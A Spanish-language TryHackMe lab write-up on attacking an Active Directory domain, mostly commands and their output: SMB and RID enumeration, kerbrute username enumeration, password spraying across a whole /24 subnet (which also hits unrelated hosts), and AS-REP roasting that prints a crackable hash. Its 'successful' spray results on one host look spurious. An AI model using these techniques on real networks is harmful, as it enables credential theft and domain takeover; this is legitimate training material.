# Resolución de la Máquina: Attacktive Directory

- **Plataforma:** TryHackMe
- **Dificultad:** Media
- **Fecha de resolución:** 07/07/2025
- **Sistema Operativo:** Windows Server

Descripción

"Attacktive Directory" es una máquina enfocada en el reconocimiento y explotación de un entorno Active Directory, diseñada para introducir al atacante en técnicas comunes de post-explotación en redes corporativas basadas en Windows.

Esta máquina simula un entorno realista con un controlador de dominio y usuarios dentro de un dominio empresarial. El objetivo principal es comprometer la red interna aprovechando vulnerabilidades comunes en servicios expuestos, abuso de configuraciones débiles y técnicas de movimiento lateral dentro de un dominio Active Directory.

Durante la resolución se exploran pasos clave como:

> Enumeración de servicios expuestos en un entorno Windows (LDAP, SMB, Kerberos, etc.)

> Enumeración de usuarios y grupos dentro del dominio utilizando herramientas como enum4linux, impacket y ldapsearch

> Ataques a protocolos de autenticación como Kerberos (AS-REP Roasting, Kerberoasting)

> Acceso inicial mediante credenciales expuestas o crackeadas, seguido por escalada de privilegios hasta obtener control total del dominio

Esta máquina es especialmente útil para:

> Comprender el funcionamiento básico de un entorno Active Directory

> Practicar ataques realistas en redes corporativas Windows

> Aprender el uso de herramientas como Impacket, BloodHound, y Evil-WinRM

> Fortalecer habilidades en post-explotación y movimiento lateral dentro de un dominio Windows

## Enumeración básica

Para ello utilizaremos enum4linux, es una herramienta de enumeración para sistemas Windows que utilizan servicios SMB (Server Message Block), comúnmente en entornos de redes corporativas o Active Directory.
Su objetivo principal es obtener información útil sin credenciales o con credenciales mínimas.

```bash
─# crackmapexec smb 10.10.26.208
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing SSH protocol database
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Initializing MSSQL protocol database
[*] Initializing FTP protocol database
[*] Initializing WINRM protocol database
[*] Initializing RDP protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.10.26.208    445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~]
└─# enum4linux 10.10.26.208
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jul  7 06:44:45 2025

 =========================================( Target Information )=========================================

Target ........... 10.10.26.208
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.26.208 )============================


[E] Can't find workgroup/domain



 ================================( Nbtstat Information for 10.10.26.208 )================================

Looking up status of 10.10.26.208
No reply from 10.10.26.208

 ===================================( Session Check on 10.10.26.208 )===================================


[+] Server 10.10.26.208 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.26.208 )================================
                                                                                                                                                                                                                                            
Domain Name: THM-AD                                                                                                                                                                                                                         
Domain Sid: S-1-5-21-3591857110-2884097990-301047963

[+] Host is part of a domain (not a workgroup)                                                                                                                                                                                              
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 ===================================( OS information on 10.10.26.208 )===================================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[E] Can't get OS info with smbclient                                                                                                                                                                                                        
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+] Got OS info for 10.10.26.208 from srvinfo:                                                                                                                                                                                              
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                                                      


 =======================================( Users on 10.10.26.208 )=======================================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                                                                                                                                        
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                                                                                                                         
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 =================================( Share Enumeration on 10.10.26.208 )=================================
                                                                                                                                                                                                                                            
do_connect: Connection to 10.10.26.208 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                                                                                     

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.26.208                                                                                                                                                                                                
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 ============================( Password Policy Information for 10.10.26.208 )============================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[E] Unexpected error from polenum:                                                                                                                                                                                                          
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

[+] Attaching to 10.10.26.208 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.26.208)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

 =======================================( Groups on 10.10.26.208 )=======================================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+] Getting builtin groups:                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting builtin group memberships:                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting local groups:                                                                                                                                                                                                                  
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting local group memberships:                                                                                                                                                                                                       
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting domain groups:                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting domain group memberships:                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 ==================( Users on 10.10.26.208 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-21-3591857110-2884097990-301047963                                                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-21-3591857110-2884097990-301047963                                                                                                                                                                                                    

[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''                                                                                                                                
                                                                                                                                                                                                                                            
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)                                                                                                                                                    
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)

[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''                                                                                                                                 
                                                                                                                                                                                                                                            
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)                                                                                                                                                              
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)

 ===============================( Getting printer info for 10.10.26.208 )===============================
                                                                                                                                                                                                                                            
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                                                     


enum4linux complete on Mon Jul  7 06:49:18 2025
```
Con la información básica del dominio procederemos a enumerar los usuarios.

```bash
└─# kerbrute userenum -d spookysec.local userlist.txt --dc 10.10.173.111 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/07/25 - Ronnie Flathers @ropnop

2025/07/07 09:38:22 >  Using KDC(s):
2025/07/07 09:38:22 >   10.10.173.111:88

2025/07/07 09:38:22 >  [+] VALID USERNAME:       james@spookysec.local
2025/07/07 09:38:23 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2025/07/07 09:38:24 >  [+] VALID USERNAME:       James@spookysec.local
2025/07/07 09:38:25 >  [+] VALID USERNAME:       robin@spookysec.local
2025/07/07 09:38:29 >  [+] VALID USERNAME:       darkstar@spookysec.local
2025/07/07 09:38:32 >  [+] VALID USERNAME:       administrator@spookysec.local
2025/07/07 09:38:37 >  [+] VALID USERNAME:       backup@spookysec.local
2025/07/07 09:38:40 >  [+] VALID USERNAME:       paradox@spookysec.local
2025/07/07 09:38:56 >  [+] VALID USERNAME:       JAMES@spookysec.local
2025/07/07 09:39:01 >  [+] VALID USERNAME:       Robin@spookysec.local
2025/07/07 09:39:35 >  [+] VALID USERNAME:       Administrator@spookysec.local
2025/07/07 09:41:16 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2025/07/07 09:41:48 >  [+] VALID USERNAME:       Paradox@spookysec.local
2025/07/07 09:43:25 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2025/07/07 09:43:57 >  [+] VALID USERNAME:       ori@spookysec.local
2025/07/07 09:44:43 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2025/07/07 09:46:19 >  Done! Tested 73317 usernames (16 valid) in 476.678 seconds
```
Una vez tengamos estos enumerados los pasaremos a otra lista, la cual contendra solo los usuarios existentes en el dominio, posteriormente le haremos un password sprying

```bash
─# crackmapexec smb 10.10.26.208/24 -u users.txt -p passwordlist.txt --no-bruteforce --continue-on-success
SMB         10.10.26.53     445    JON-PC           [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:JON-PC) (domain:Jon-PC) (signing:False) (SMBv1:True)
SMB         10.10.26.9      445    BASIC2           [*] Windows 6.1 Build 0 (name:BASIC2) (domain:eu-west-1.compute.internal) (signing:False) (SMBv1:False)
SMB         10.10.26.53     445    JON-PC           [-] Jon-PC\james:m123456 STATUS_LOGON_FAILURE 
SMB         10.10.26.53     445    JON-PC           [-] Jon-PC\svc-admin:12345 STATUS_LOGON_FAILURE 
SMB         10.10.26.53     445    JON-PC           [-] Jon-PC\James:123456789 STATUS_LOGON_FAILURE 
SMB         10.10.26.53     445    JON-PC           [-] Jon-PC\robin:password STATUS_LOGON_FAILURE 
SMB         10.10.26.53     445    JON-PC           [-] Jon-PC\darkstar:iloveyou STATUS_LOGON_FAILURE 
SMB         10.10.26.53     445    JON-PC           [-] Jon-PC\administrator:princess STATUS_LOGON_FAILURE 
SMB         10.10.26.53     445    JON-PC           [-] Jon-PC\backup:1234567 STATUS_LOGON_FAILURE 
SMB         10.10.26.53     445    JON-PC           [-] Jon-PC\paradox:rockyou STATUS_LOGON_FAILURE 
SMB         10.10.26.53     445    JON-PC           [-] Jon-PC\JAMES:12345678 STATUS_LOGON_FAILURE 
SMB         10.10.26.53     445    JON-PC           [-] Jon-PC\Robin:abc123 STATUS_LOGON_FAILURE 
SMB         10.10.26.53     445    JON-PC           [-] Jon-PC\Administrator:nicole STATUS_LOGON_FAILURE 
SMB         10.10.26.53     445    JON-PC           [-] Jon-PC\Darkstar:daniel STATUS_LOGON_FAILURE 
SMB         10.10.26.53     445    JON-PC           [-] Jon-PC\Paradox:babygirl STATUS_LOGON_FAILURE 
SMB         10.10.26.53     445    JON-PC           [-] Jon-PC\DARKSTAR:monkey STATUS_LOGON_FAILURE 
SMB         10.10.26.53     445    JON-PC           [-] Jon-PC\ori:lovely STATUS_LOGON_FAILURE 
SMB         10.10.26.53     445    JON-PC           [-] Jon-PC\ROBIN:jessica STATUS_LOGON_FAILURE 
SMB         10.10.26.9      445    BASIC2           [+] eu-west-1.compute.internal\james:m123456 
SMB         10.10.26.9      445    BASIC2           [+] eu-west-1.compute.internal\svc-admin:12345 
SMB         10.10.26.9      445    BASIC2           [+] eu-west-1.compute.internal\James:123456789 
SMB         10.10.26.9      445    BASIC2           [+] eu-west-1.compute.internal\robin:password 
SMB         10.10.26.9      445    BASIC2           [+] eu-west-1.compute.internal\darkstar:iloveyou 
SMB         10.10.26.9      445    BASIC2           [+] eu-west-1.compute.internal\administrator:princess 
SMB         10.10.26.9      445    BASIC2           [+] eu-west-1.compute.internal\backup:1234567 
SMB         10.10.26.9      445    BASIC2           [+] eu-west-1.compute.internal\paradox:rockyou 
SMB         10.10.26.9      445    BASIC2           [+] eu-west-1.compute.internal\JAMES:12345678 
SMB         10.10.26.9      445    BASIC2           [+] eu-west-1.compute.internal\Robin:abc123 
SMB         10.10.26.9      445    BASIC2           [+] eu-west-1.compute.internal\Administrator:nicole 
SMB         10.10.26.9      445    BASIC2           [+] eu-west-1.compute.internal\Darkstar:daniel 
SMB         10.10.26.9      445    BASIC2           [+] eu-west-1.compute.internal\Paradox:babygirl 
SMB         10.10.26.9      445    BASIC2           [+] eu-west-1.compute.internal\DARKSTAR:monkey 
SMB         10.10.26.9      445    BASIC2           [+] eu-west-1.compute.internal\ori:lovely 
SMB         10.10.26.9      445    BASIC2           [+] eu-west-1.compute.internal\ROBIN:jessica
```
Tambien podemos encontrar hashes de usuarios que no requieran preautenticación en Kerberos, previamente deneremos apuntar la IP al dominio en /etc/hots
```bash
─# impacket-GetNPUsers spookysec.local/ -no-pass -usersfile users.txt
Impacket v0.13.0.dev0+20250702.182415.b33e994d - Copyright Fortra, LLC and its affiliated companies 

[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:2db974c1e914d5ae91408bd30536634f$85916b3fc6673c5dcc30b88a2b665e1b16de2f5daca9b6b4afaffd4672fccf4ad64bb3ae5441792de53b52508be7009295af9c5c9c3f1aa851b668da350fb68c78c21055c7bdc7238e74927b719ec11612a3d9242dc16ce14a3baeebf3f649e3cea1176be57d7dade1b4b4b01f1fa814e2a42a2bad55a88e267dcba086dcea733a7b289358ad0bfef1d84ff07b0d5cd8bc7138ce7ce8a9c3a6617d6e66f3e8a0a69da253f0668adc8ea21e48c18b467e555dfe4a908926f71e4f30efd69ea50344d293d3254ff157cd4a2642403979df4a688b1b8789da6545177c90bccd52067610e9edb7517a6c4b813508c7d9210e9633
[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JAMES doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DARKSTAR doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ori doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ROBIN doesn't have UF_DONT_REQUIRE_PREAUTH set
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/THM/AttacktiveDirectory]
└─# 
```
